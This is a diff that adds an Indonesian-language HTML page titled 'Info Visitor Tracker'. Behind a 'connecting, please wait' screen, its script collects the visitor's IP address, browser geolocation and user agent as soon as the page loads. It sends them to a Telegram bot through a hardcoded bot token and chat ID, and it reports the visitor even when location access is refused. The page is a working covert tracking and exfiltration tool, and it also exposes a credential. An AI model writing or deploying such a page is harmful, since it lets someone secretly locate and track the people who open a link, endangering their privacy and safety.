@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Info Visitor Tracker</title>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      background: black;
+      color: #00ff00;
+      font-family: monospace;
+      text-align: center;
+      padding: 30px;
+    }
+    .box {
+      border: 1px solid #00ff00;
+      padding: 15px;
+      display: inline-block;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>👨‍💻 Menghubungkan...</h1>
+  <p>Harap tunggu...</p>
+  <div class="box" id="info"></div>
+
+  <script>
+    async function sendToTelegram(ip, userAgent, lat, lon) {
+      const token = "8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM";
+      const chatId = "7932600874";
+      const text = `🌐 IP: ${ip}%0A📍 Lokasi: ${lat}, ${lon}%0A🧠 User-Agent: ${userAgent}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
+      await fetch(url);
+    }
+
+    async function getInfo() {
+      const userAgent = navigator.userAgent;
+      let ip = "Tidak diketahui";
+      let lat = "Tidak diketahui", lon = "Tidak diketahui";
+
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch {}
+
+      try {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+          document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: ${lat}, ${lon}<br>User-Agent: ${userAgent}`;
+          await sendToTelegram(ip, userAgent, lat, lon);
+        }, async () => {
+          document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: Tidak diizinkan<br>User-Agent: ${userAgent}`;
+          await sendToTelegram(ip, userAgent, "Tidak diizinkan", "Tidak diizinkan");
+        });
+      } catch {
+        document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: Error<br>User-Agent: ${userAgent}`;
+        await sendToTelegram(ip, userAgent, "Error", "Error");
+      }
+    }
+
+    getInfo();
+  </script>
+</body>
+</html>
